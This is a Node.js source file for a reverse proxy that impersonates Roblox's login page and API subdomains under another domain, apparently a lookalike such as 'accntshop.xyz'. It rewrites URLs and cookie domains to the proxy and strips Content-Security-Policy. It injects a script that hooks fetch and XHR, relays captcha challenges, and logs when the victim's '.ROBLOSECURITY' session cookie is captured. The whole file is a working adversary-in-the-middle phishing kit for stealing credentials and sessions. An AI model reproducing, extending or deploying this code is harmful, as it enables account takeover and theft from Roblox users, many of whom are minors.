const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');
const { spawn, execFile } = require('child_process');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - CAPTCHA RENDERING FIX');
console.log('='.repeat(60));

// ─────────────────────────────────────────────────────────────
// curl-impersonate auto-detection
// ─────────────────────────────────────────────────────────────
let CURL_BIN = 'curl';

function detectCurlBin() {
    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl-impersonate-chrome', 'curl'];
    let idx = 0;
    function tryNext() {
        if (idx >= candidates.length) return;
        const bin = candidates[idx++];
        execFile(bin, ['--version'], { timeout: 3000 }, (err) => {
            if (!err) {
                CURL_BIN = bin;
                console.log(`✅ Using: ${bin}`);
            } else {
                tryNext();
            }
        });
    }
    tryNext();
}
detectCurlBin();

// Shared HTTPS agent
const httpsAgent = new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000,
    rejectUnauthorized: true
});

const httpAgent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000
});

// Domain map - Roblox APIs (Arkose is NOT included - browser connects directly)
const SUBDOMAIN_MAP = {
    'auth-api': 'https://auth.roblox.com',
    'apis-api': 'https://apis.roblox.com',
    'api-api': 'https://api.roblox.com',
    'economy-api': 'https://economy.roblox.com',
    'users-api': 'https://users.roblox.com',
    'catalog-api': 'https://catalog.roblox.com',
    'games-api': 'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api': 'https://ecsv2.roblox.com',
    'js-cdn': 'https://js.rbxcdn.com',
    'css-cdn': 'https://css.rbxcdn.com',
    'images-cdn': 'https://images.rbxcdn.com',
    'static-cdn': 'https://static.rbxcdn.com',
    'rbxcdn': 'https://www.rbxcdn.com',
    'content-cdn': 'https://content.roblox.com',
    'auth-token-service': 'https://auth-token-service.roblox.com',
    'hba-service': 'https://hba-service.roblox.com',
    'proof-of-work-service': 'https://proof-of-work-service.roblox.com',
    'account-security-service': 'https://account-security-service.roblox.com',
    'rotating-client-service': 'https://rotating-client-service.roblox.com',
    'guac-v2': 'https://guac-v2.roblox.com',
    'product-experimentation-platform': 'https://product-experimentation-platform.roblox.com',
    'otp-service': 'https://otp-service.roblox.com',
    'challenge': 'https://challenge.roblox.com',
    'captcha': 'https://captcha.roblox.com',
    'abuse': 'https://abuse.roblox.com',
    'client-telemetry': 'https://client-telemetry.roblox.com',
    'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
    'metrics': 'https://metrics.roblox.com',
    'locale': 'https://locale.roblox.com',
    'notification': 'https://notification.roblox.com',
    'realtime': 'https://realtime.roblox.com',
    'presence': 'https://presence.roblox.com',
    'friends': 'https://friends.roblox.com',
    'groups': 'https://groups.roblox.com',
    'inventory': 'https://inventory.roblox.com',
    'trades': 'https://trades.roblox.com',
    'billing': 'https://billing.roblox.com',
    'premium': 'https://premium.roblox.com',
    'badges': 'https://badges.roblox.com',
    'avatar': 'https://avatar.roblox.com',
    'develop': 'https://develop.roblox.com',
    'publish': 'https://publish.roblox.com',
    'voice': 'https://voice.roblox.com',
    'chat': 'https://chat.roblox.com',
    'privatemessages': 'https://privatemessages.roblox.com',
    'share': 'https://share.roblox.com',
    'ads': 'https://ads.roblox.com',
    'followings': 'https://followings.roblox.com',
    'engagementpayouts': 'https://engagementpayouts.roblox.com',
    'assetdelivery': 'https://assetdelivery.roblox.com',
    'gamepersistence': 'https://gamepersistence.roblox.com',
    'games': 'https://games.roblox.com',
    'textfilter': 'https://textfilter.roblox.com',
    'translations': 'https://translations.roblox.com',
    'users': 'https://users.roblox.com',
    'accountsettings': 'https://accountsettings.roblox.com',
    'adconfiguration': 'https://adconfiguration.roblox.com',
    'clientsettings': 'https://clientsettings.roblox.com',
    'clientsettingscdn': 'https://clientsettingscdn.roblox.com',
    'datametrics': 'https://datametrics.roblox.com',
    'usermoderation': 'https://usermoderation.roblox.com',
    'points': 'https://points.roblox.com',
    'thumbnails': 'https://thumbnails.roblox.com',
    'apis-rbxcdn': 'https://apis.rbxcdn.com',
    'captcha-rbxcdn': 'https://captcha.rbxcdn.com',
    // NOTE: arkoselabs.roblox.com is NOT proxied - browser connects directly
};

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'x-retry-attempt',
];

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    const cleanHost = host.replace(/^www\./, '');
    return cookies.map(cookie => {
        return cookie
            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
            .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
            .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
    });
}

function getDeviceId(req) {
    const cookies = req.headers.cookie || '';
    const match = cookies.match(/rbx-device-id=([^;]+)/);
    if (match) return match[1];
    return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// Rewrite URLs in HTML - BUT NOT Arkose URLs
function rewriteUrls(body, host) {
    const cleanHost = host.replace(/^www\./, '');
    let result = body;
    
    const entries = Object.entries(SUBDOMAIN_MAP).sort((a, b) => b[1].length - a[1].length);
    
    for (const [prefix, target] of entries) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${cleanHost}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${cleanHost}/${prefix}`);
    }
    
    // Rewrite main Roblox domains
    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${cleanHost}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${cleanHost}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${cleanHost}`);
    
    // IMPORTANT: Do NOT rewrite arkoselabs.roblox.com URLs
    // The browser must connect directly to Arkose for the captcha to work
    
    return result;
}

// Make request via curl-impersonate for Arkose (to bypass TLS fingerprint detection)
function makeCurlRequest(method, url, headers, body) {
    return new Promise((resolve, reject) => {
        const args = [
            '--silent',
            '--include',
            '--max-time', '30',
            '--http2',
            '--compressed',
            '-X', method.toUpperCase(),
        ];

        const skip = new Set(['host', 'content-length', 'transfer-encoding', 'connection', 'accept-encoding']);
        for (const [k, v] of Object.entries(headers)) {
            if (!skip.has(k.toLowerCase())) {
                args.push('-H', `${k}: ${v}`);
            }
        }

        if (body && body.length > 0) {
            args.push('--data-binary', '@-');
        }

        args.push(url);

        const child = spawn(CURL_BIN, args, { timeout: 35000 });

        if (body && body.length > 0) {
            child.stdin.write(body);
            child.stdin.end();
        } else {
            child.stdin.end();
        }

        const chunks = [];
        child.stdout.on('data', c => chunks.push(c));
        child.on('error', reject);

        child.on('close', () => {
            const buf = Buffer.concat(chunks);
            const raw = buf.toString('binary');

            const httpRe = /HTTP\/[\d.]+ \d+[^\r\n]*/g;
            let lastMatch = null, m;
            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;

            if (!lastMatch) {
                return reject(new Error('No HTTP response'));
            }

            const hdrStart = lastMatch.index;
            const hdrEnd = raw.indexOf('\r\n\r\n', hdrStart);
            if (hdrEnd === -1) {
                return reject(new Error('No headers end'));
            }

            const headersStr = raw.substring(hdrStart, hdrEnd);
            const bodyBuffer = buf.slice(hdrEnd + 4);

            const statusCode = parseInt(lastMatch[0].match(/\d{3}/)[0], 10);
            const parsedHdrs = {};
            for (const line of headersStr.split('\r\n').slice(1)) {
                const ci = line.indexOf(':');
                if (ci < 1) continue;
                const k = line.substring(0, ci).trim().toLowerCase();
                const v = line.substring(ci + 1).trim();
                parsedHdrs[k] = parsedHdrs[k] ? [].concat(parsedHdrs[k], v) : v;
            }

            resolve({ statusCode, headers: parsedHdrs, body: bodyBuffer });
        });
    });
}

async function doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, maxRetries = 2) {
    let lastError;
    for (let i = 0; i <= maxRetries; i++) {
        try {
            return await doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders);
        } catch (err) {
            lastError = err;
            if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT') {
                await new Promise(r => setTimeout(r, 500 * (i + 1)));
                continue;
            }
            throw err;
        }
    }
    throw lastError;
}

function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
    return new Promise((resolve, reject) => {
        const bodyBuf = Buffer.from(bodyStr, 'utf8');

        const headers = {
            'Content-Type': 'application/json;charset=UTF-8',
            'Content-Length': bodyBuf.length,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            'User-Agent': ua || BROWSER_UA,
            'Connection': 'keep-alive',
        };

        for (const h of ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token', ...CHALLENGE_HEADERS]) {
            if (extraHeaders[h]) headers[h] = extraHeaders[h];
        }

        if (cookieHeader) headers['Cookie'] = cookieHeader;
        if (csrfToken) headers['X-CSRF-TOKEN'] = csrfToken;

        const hasChallenge = !!(extraHeaders['rblx-challenge-metadata'] && extraHeaders['rblx-challenge-id']);
        console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? 'yes' : 'none'} | Challenge: ${hasChallenge ? 'YES' : 'NO'}`);

        const reqOut = https.request({
            hostname: 'auth.roblox.com',
            path: '/v2/login',
            method: 'POST',
            headers,
            agent: httpsAgent,
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
        });

        reqOut.on('error', reject);
        reqOut.write(bodyBuf);
        reqOut.end();
    });
}

// =========================
// LOGIN HANDLER
// =========================
app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const host = req.headers.host || 'localhost';
    const ua = req.headers['user-agent'] || BROWSER_UA;
    const incomingCookies = req.headers['cookie'] || '';
    const origin = req.headers['origin'] || `https://${host}`;
    const deviceId = getDeviceId(req);

    const hasChallenge = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
    console.log(`🔑 LOGIN | Challenge solution: ${hasChallenge ? 'YES' : 'NO'}`);
    
    if (req.headers['rblx-challenge-metadata']) {
        try {
            const decoded = Buffer.from(req.headers['rblx-challenge-metadata'], 'base64').toString('utf8');
            console.log('   Challenge metadata:', JSON.parse(decoded));
        } catch(e) {}
    }

    try {
        const bodyStr = req.body.toString('utf8');

        if (hasChallenge) {
            let result = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
            console.log(`   Attempt 1: ${result.status}`);

            if (result.status === 403 && result.headers['x-csrf-token']) {
                let cookieHeader = incomingCookies;
                if (result.headers['set-cookie']) {
                    cookieHeader = `${cookieHeader}; ${result.headers['set-cookie'].map(c => c.split(';')[0]).join('; ')}`;
                }
                result = await doLoginRequestWithRetry(bodyStr, cookieHeader, result.headers['x-csrf-token'], ua, req.headers);
                console.log(`   Attempt 2: ${result.status}`);
            }

            if (result.status === 200) console.log('✅ LOGIN SUCCESS');
            else console.log(`❌ LOGIN FAILED: ${result.status}`);

            return forwardResponse(res, result, host, origin, deviceId);
        }

        const first = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
        console.log(`   Step 1: ${first.status}`);

        if (!first.headers['x-csrf-token']) {
            return forwardResponse(res, first, host, origin, deviceId);
        }

        let cookieHeader = incomingCookies;
        if (first.headers['set-cookie']) {
            cookieHeader = `${cookieHeader}; ${first.headers['set-cookie'].map(c => c.split(';')[0]).join('; ')}`;
        }

        const second = await doLoginRequestWithRetry(bodyStr, cookieHeader, first.headers['x-csrf-token'], ua, req.headers);
        console.log(`   Step 2: ${second.status}`);

        if (second.status === 403 && second.headers['rblx-challenge-id']) {
            console.log('   🧩 Challenge required');
        }

        forwardResponse(res, second, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
});

function forwardResponse(res, response, host, origin, deviceId) {
    const status = response.status;
    const headers = response.headers;

    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));

    for (const key of ['x-csrf-token', 'rblx-challenge-id', 'rblx-challenge-type', 'rblx-challenge-metadata', 'content-type', 'cache-control']) {
        if (headers[key]) res.set(key, headers[key]);
    }

    const cookies = headers['set-cookie'];
    let allCookies = rewriteCookies(cookies, host) || [];

    if ((cookies || []).some(c => c.includes('.ROBLOSECURITY'))) {
        console.log('✅ .ROBLOSECURITY received — login confirmed!');
    }
    
    if (deviceId) {
        allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
    }
    
    if (allCookies.length > 0) res.set('Set-Cookie', allCookies);
    if (!headers['content-type']) res.set('Content-Type', 'application/json');

    res.status(status).send(response.body);
}

// =========================
// INJECTED CLIENT SCRIPT
// =========================
function buildInjectedScript(host) {
    const cleanHost = host.replace(/^www\./, '');
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${cleanHost}/${prefix}`)}]`)
        .join(',');

    return `<script>
(function() {
    const PROXY_HOST = ${JSON.stringify(`https://${cleanHost}`)};
    const DOMAIN_MAP = [${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com", PROXY_HOST],
        ["https://roblox.com", PROXY_HOST]
    ].sort((a, b) => b[0].length - a[0].length);
    
    // Challenge state stored in sessionStorage
    const state = {
        challengeId: sessionStorage.getItem('__rblxChallengeId') || null,
        challengeType: sessionStorage.getItem('__rblxChallengeType') || null,
        userId: sessionStorage.getItem('__rblxUserId') || null,
        browserTrackerId: sessionStorage.getItem('__rblxBrowserTrackerId') || null,
        solved: sessionStorage.getItem('__rblxChallengeSolved') === 'true',
        captchaToken: sessionStorage.getItem('__rblxCaptchaToken') || null,
    };
    
    function log(msg, data) {
        console.log('[Proxy]', msg, data || '');
    }
    
    function saveState() {
        Object.entries(state).forEach(([k, v]) => {
            if (v !== null && v !== undefined) sessionStorage.setItem('__rblx' + k.charAt(0).toUpperCase() + k.slice(1), v);
        });
        sessionStorage.setItem('__rblxChallengeSolved', state.solved ? 'true' : 'false');
    }

    function constructMetadata() {
        if (state.captchaToken && state.challengeId) {
            return btoa(JSON.stringify({
                unifiedCaptchaId: state.challengeId,
                captchaToken: state.captchaToken,
                actionType: "Login"
            }));
        }
        if (!state.challengeId || !state.userId) return null;
        return btoa(JSON.stringify({
            userId: state.userId,
            challengeId: state.challengeId,
            browserTrackerId: state.browserTrackerId || ''
        }));
    }

    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        if (url.startsWith('//')) url = 'https:' + url;
        
        // CRITICAL: Don't rewrite Arkose URLs - browser must connect directly
        if (url.includes('arkoselabs') || url.includes('funcaptcha')) {
            return url;
        }
        
        for (const [from, to] of DOMAIN_MAP) {
            if (url.startsWith(from)) return to + url.slice(from.length);
        }
        return url;
    }

    // Intercept fetch
    const _fetch = window.fetch;
    window.fetch = function(resource, init) {
        const url = typeof resource === 'string' ? resource : resource.url;
        const rewrittenUrl = rewriteUrl(url);
        
        init = init || {};
        init.credentials = 'include';

        const isLogin = url.includes('/v2/login') || rewrittenUrl.includes('/auth-api/v2/login');
        const isContinue = url.includes('challenge/v1/continue');
        
        if (isLogin && state.challengeId && (state.userId || state.captchaToken)) {
            const metadata = constructMetadata();
            if (metadata) {
                init.headers = init.headers || {};
                init.headers['rblx-challenge-id'] = state.challengeId;
                init.headers['rblx-challenge-type'] = state.challengeType || 'captcha';
                init.headers['rblx-challenge-metadata'] = metadata;
                init.headers['x-retry-attempt'] = '1';
                log('Added challenge headers to login', {id: state.challengeId});
            }
        }
        
        if (isContinue && state.challengeId) {
            init.headers = init.headers || {};
            init.headers['rblx-challenge-id'] = state.challengeId;
            init.headers['rblx-challenge-type'] = state.challengeType || 'captcha';
        }
        
        const finalResource = typeof resource === 'string' ? rewrittenUrl : new Request(rewrittenUrl, init);

        return _fetch.call(this, finalResource, init).then(response => {
            const challengeId = response.headers.get('rblx-challenge-id');
            const challengeType = response.headers.get('rblx-challenge-type');
            const challengeMetadata = response.headers.get('rblx-challenge-metadata');

            if (challengeId && challengeMetadata) {
                log('New challenge from headers', {id: challengeId, type: challengeType});
                state.challengeId = challengeId;
                state.challengeType = challengeType;
                state.solved = false;
                state.captchaToken = null;
                try {
                    const meta = JSON.parse(atob(challengeMetadata));
                    state.userId = meta.userId;
                    state.browserTrackerId = meta.browserTrackerId;
                    saveState();
                } catch(e) {}
            }

            if (isContinue) {
                response.clone().text().then(text => {
                    try {
                        const data = JSON.parse(text);
                        if (data.challengeType) {
                            log('Chained challenge', {type: data.challengeType});
                            state.challengeId = data.challengeId;
                            state.challengeType = data.challengeType;
                            state.solved = false;
                            state.captchaToken = null;
                            saveState();
                        } else if (response.status === 200) {
                            state.solved = true;
                            saveState();
                        }
                    } catch(e) {}
                });
            }

            return response;
        });
    };

    // Intercept XHR
    const _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this.__url = rewriteUrl(url);
        return _open.call(this, method, this.__url);
    };

    const _setHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(h, v) {
        this.__headers = this.__headers || {};
        this.__headers[h.toLowerCase()] = v;
        return _setHeader.call(this, h, v);
    };

    const _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        this.withCredentials = true;
        
        const isLogin = this.__url && (this.__url.includes('/v2/login') || this.__url.includes('/auth-api/v2/login'));
        const isContinue = this.__url && this.__url.includes('challenge/v1/continue');
        
        if (isLogin && state.challengeId && (state.userId || state.captchaToken)) {
            const metadata = constructMetadata();
            if (metadata && !this.__headers?.['rblx-challenge-metadata']) {
                _setHeader.call(this, 'rblx-challenge-id', state.challengeId);
                _setHeader.call(this, 'rblx-challenge-type', state.challengeType || 'captcha');
                _setHeader.call(this, 'rblx-challenge-metadata', metadata);
                _setHeader.call(this, 'x-retry-attempt', '1');
            }
        }

        if (isContinue && state.challengeId && !this.__headers?.['rblx-challenge-id']) {
            _setHeader.call(this, 'rblx-challenge-id', state.challengeId);
            _setHeader.call(this, 'rblx-challenge-type', state.challengeType || 'captcha');
        }

        const self = this;
        const origOnReady = this.onreadystatechange;
        this.onreadystatechange = function() {
            if (self.readyState === 4) {
                const cid = self.getResponseHeader('rblx-challenge-id');
                const ctype = self.getResponseHeader('rblx-challenge-type');
                const cmeta = self.getResponseHeader('rblx-challenge-metadata');
                
                if (cid && cmeta) {
                    state.challengeId = cid;
                    state.challengeType = ctype;
                    state.solved = false;
                    state.captchaToken = null;
                    try {
                        const meta = JSON.parse(atob(cmeta));
                        state.userId = meta.userId;
                        state.browserTrackerId = meta.browserTrackerId;
                        saveState();
                    } catch(e) {}
                }
            }
            if (origOnReady) return origOnReady.apply(this, arguments);
        };

        return _send.call(this, body);
    };

    // Intercept element creation
    const _createElement = document.createElement;
    document.createElement = function(tag) {
        const el = _createElement.call(document, tag);
        if (tag.toLowerCase() === 'script') {
            const _setAttr = el.setAttribute;
            el.setAttribute = function(n, v) {
                if (n === 'src') v = rewriteUrl(v);
                return _setAttr.call(this, n, v);
            };
            Object.defineProperty(el, 'src', {
                set: function(v) { this.setAttribute('src', rewriteUrl(v)); },
                get: function() { return this.getAttribute('src'); }
            });
        }
        if (tag.toLowerCase() === 'iframe') {
            const _setAttr = el.setAttribute;
            el.setAttribute = function(n, v) {
                if (n === 'src' || n === 'data-src') v = rewriteUrl(v);
                return _setAttr.call(this, n, v);
            };
        }
        return el;
    };

    // Global callback for Arkose to provide token
    window.setRblxCaptchaToken = function(token) {
        log('Captcha token received', {token: token?.substring(0, 30) + '...'});
        state.captchaToken = token;
        state.solved = true;
        saveState();
    };

    window.getRblxChallengeState = () => ({...state, captchaToken: state.captchaToken ? 'yes' : 'no'});
    window.clearRblxChallengeState = () => {
        Object.keys(state).forEach(k => state[k] = k === 'solved' ? false : null);
        ['ChallengeId', 'ChallengeType', 'UserId', 'BrowserTrackerId', 'ChallengeSolved', 'CaptchaToken'].forEach(k => {
            sessionStorage.removeItem('__rblx' + k);
        });
    };

    log('Proxy loaded. State:', window.getRblxChallengeState());
})();
</script>`;
}

// =========================
// MIDDLEWARE
// =========================
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const ms = Date.now() - start;
        if (!req.path.includes('arkose') && req.path !== '/www/e.png' && req.path !== '/pe') {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${ms}ms)`);
        }
    });
    next();
});

app.options('*', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    res.set({
        'access-control-allow-origin': origin,
        'access-control-allow-credentials': 'true',
        'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
        'access-control-allow-headers': [
            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id',
            'x-bound-auth-token', 'Accept', ...CHALLENGE_HEADERS
        ].join(', '),
    });
    res.sendStatus(200);
});

// =========================
// PROXY FACTORY
// =========================
function createRobloxProxy(prefix, target) {
    return createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        pathRewrite: { [`^/${prefix}`]: '' },
        proxyTimeout: 30000,
        timeout: 30000,
        agent: target.startsWith('https:') ? httpsAgent : httpAgent,
        
        on: {
            proxyReq: (proxyReq, req) => {
                if (proxyReq.headersSent) return;
                try {
                    proxyReq.setHeader('origin', 'https://www.roblox.com');
                    proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                    proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                    proxyReq.setHeader('accept', req.headers['accept'] || 'application/json, text/plain, */*');
                    proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                    
                    if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
                    for (const h of CHALLENGE_HEADERS) {
                        if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]);
                    }
                } catch (err) {
                    if (err.code !== 'ERR_HTTP_HEADERS_SENT') throw err;
                }
            },

            proxyRes: (proxyRes, req) => {
                if (proxyRes.headers['set-cookie']) {
                    proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], req.headers.host);
                }
                
                delete proxyRes.headers['content-security-policy'];
                delete proxyRes.headers['content-security-policy-report-only'];
                
                const origin = req.headers['origin'] || `https://${req.headers.host}`;
                proxyRes.headers['access-control-allow-origin'] = origin;
                proxyRes.headers['access-control-allow-credentials'] = 'true';
                proxyRes.headers['access-control-expose-headers'] = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
            },

            error: (err, req, res) => {
                console.error(`[proxy] ${req.path} | ${err.code}: ${err.message}`);
                if (!res.headersSent) res.status(502).json({ error: 'Proxy error' });
            }
        }
    });
}

// Register proxies
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    app.use(`/${prefix}`, createRobloxProxy(prefix, target));
}

// =========================
// MAIN PAGE PROXY
// =========================
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,
    pathRewrite: (path) => path === '/' ? '/login' : path,

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['content-security-policy-report-only'];
            
            const host = req.headers.host || 'accntshop.xyz';
            if (proxyRes.headers['set-cookie']) {
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
            }

            res.setHeader('access-control-allow-origin', `https://${host}`);
            res.setHeader('access-control-allow-credentials', 'true');

            if ((proxyRes.headers['content-type'] || '').includes('text/html')) {
                let body = buffer.toString('utf8');
                body = rewriteUrls(body, host);
                body = body.replace('<head', `<head>${buildInjectedScript(host)}`);
                return body;
            }
            return buffer;
        }),

        error: (err, req, res) => {
            console.error(`[main] ${err.message}`);
            if (!res.headersSent) res.status(502).send('Proxy error');
        }
    }
}));

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
    console.log(`📋 Arkose (arkoselabs.roblox.com) connects DIRECTLY - not proxied`);
});
